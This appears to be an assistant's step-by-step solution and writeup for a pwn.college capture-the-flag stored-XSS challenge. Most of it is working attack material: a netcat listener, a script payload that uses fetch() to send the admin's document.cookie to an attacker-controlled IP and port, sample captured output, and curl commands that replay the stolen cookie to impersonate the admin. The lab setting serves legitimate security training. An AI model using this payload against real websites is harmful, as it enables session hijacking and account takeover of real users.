Excellent â€” that hint makes the solution easier. It tells you:

> You **donâ€™t need a Flask app or Python server** â€” a simple listener using `nc` (**netcat**) is enough to capture the adminâ€™s cookie.

Letâ€™s go through the **detailed steps to solve the challenge**, assuming the following:

* You can **submit a post** (e.g., via `/draft`) as a normal user.
* The **admin will visit `/`**, which renders your post (where your XSS will run).
* You can **listen with `nc`** to exfiltrate data (cookie).
* The admin has a cookie `auth=admin|pwn.college{...}` which you want to steal.

---

## âœ… DETAILED STEPS

### ğŸ”§ Step 1: Run a `netcat` listener

On your machine (terminal), run:

```bash
nc -lvnp 8000
```

Explanation:

* `-l`: Listen mode.
* `-v`: Verbose (see connection details).
* `-n`: Donâ€™t do DNS lookups.
* `-p 8000`: Use port 8000.

This will wait for HTTP requests and print them â€” including the `auth` cookie.

---

### ğŸŒ Step 2: Find Your IP

Find your **public IP** (or internal IP if the target is on the same network).

To get your public IP:

```bash
curl ifconfig.me
```

Letâ€™s say itâ€™s: `1.2.3.4`
(If youâ€™re on a CTF box or Docker image, it might be `172.x.x.x` or `10.x.x.x` â€” depends on network setup.)

If this IP is reachable by the challenge, weâ€™re good.

---

### âœï¸ Step 3: Craft the XSS Payload

Now, you want to **inject JavaScript** that steals the cookie and sends it to your IP+port.

Here's a **working payload**:

```html
<script>
    fetch("http://1.2.3.4:8000/?cookie=" + document.cookie);
</script>
```

Explanation:

* When the admin opens the post, the script runs.
* `document.cookie` contains the `auth=admin|...` token.
* The cookie is sent to your `netcat` listener.

---

### ğŸ§ª Step 4: Submit the Payload

Log in as the user `hacker / 1337`.
Go to `/draft` and create a post that includes the XSS payload.

For example:

* Title: `Test`
* Content:

```html
<script>
fetch("http://1.2.3.4:8000/?cookie=" + document.cookie);
</script>
```

Click **Submit**.

---

### â³ Step 5: Wait for the Admin

The system will automatically simulate an admin visiting `/` and rendering all posts.

You will see a request hit your netcat listener like:

```
GET /?cookie=auth=admin|pwn.college{XSS_pwned!} HTTP/1.1
Host: 1.2.3.4:8000
User-Agent: Mozilla/5.0 ...
...
```

This gives you the full `auth` cookie!

---

### ğŸ”“ Step 6: Use the Admin Cookie

Now use `curl` to impersonate the admin and access `/` or any other restricted data:

```bash
curl -b "auth=admin|pwn.college{XSS_pwned!}" http://challenge.localhost/
```

Or, more accurately (if remote):

```bash
curl -b "auth=admin|pwn.college{XSS_pwned!}" http://<challenge-ip>/
```

Look for content like:

```
<h1>Welcome, admin</h1>
<article>pwn.college{XSS_pwned!}</article>
```

---

## ğŸ“ WRITEUP: "XSS Cookie Stealer"

**Challenge Type:** Web security
**Technique:** Stored XSS â†’ Cookie Theft â†’ Admin Impersonation

---

### âœ… Exploitation Steps:

1. We are logged in as a normal user (`hacker`) and can submit posts via `/draft`.
2. These posts are rendered in `/`, including for the admin who views the site automatically.
3. The admin's session is authenticated via the cookie: `auth=admin|pwn.college{...}`.
4. We exploit a stored XSS by submitting a malicious `<script>` tag that runs in the admin's browser.
5. The JavaScript uses `fetch()` to exfiltrate `document.cookie` to our server.
6. We listen using a simple `netcat` command:

   ```bash
   nc -lvnp 8000
   ```
7. Once the admin visits `/`, our script runs and we receive the cookie.
8. Using the stolen cookie, we send authenticated requests and dump the flag.

---

### âœ… Payload Used

```html
<script>
fetch("http://1.2.3.4:8000/?cookie=" + document.cookie);
</script>
```

---

### âœ… Outcome

We successfully obtained the admin's cookie and used it to view the page as admin, revealing the full flag.
